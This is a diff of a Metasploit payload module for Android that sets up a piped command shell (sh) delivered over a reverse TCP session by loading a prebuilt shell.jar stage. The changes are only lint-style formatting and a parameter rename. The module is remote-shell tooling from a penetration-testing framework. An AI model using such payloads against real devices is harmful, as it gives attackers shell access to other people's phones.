@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -9,32 +10,30 @@ require 'msf/core/handler/reverse_tcp'
 require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
 
-
 module MetasploitModule
-
   # The stager should have already included this
-  #include Msf::Payload::Java
+  # include Msf::Payload::Java
   include Msf::Sessions::CommandShellOptions
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'			=> 'Command Shell',
-      'Description'	=> 'Spawn a piped command shell (sh)',
-      'Author'		=> [
-          'mihi', # all the hard work
-          'egypt' # msf integration
-        ],
-      'Platform'		=> 'android',
-      'Arch'			=> ARCH_DALVIK,
-      'License'		=> MSF_LICENSE,
-      'Session'		=> Msf::Sessions::CommandShell))
+                      'Name'			=> 'Command Shell',
+                      'Description'	=> 'Spawn a piped command shell (sh)',
+                      'Author'		=> [
+                        'mihi', # all the hard work
+                        'egypt' # msf integration
+                      ],
+                      'Platform'		=> 'android',
+                      'Arch'			=> ARCH_DALVIK,
+                      'License'		=> MSF_LICENSE,
+                      'Session'		=> Msf::Sessions::CommandShell))
   end
 
   #
   # Override the {Payload::Android} version so we can load a prebuilt jar
   # to be used as the final stage
   #
-  def generate_stage(opts={})
+  def generate_stage(_opts = {})
     clazz = 'androidpayload.stage.Shell'
     shell_jar = MetasploitPayloads.read("android", "shell.jar")
 
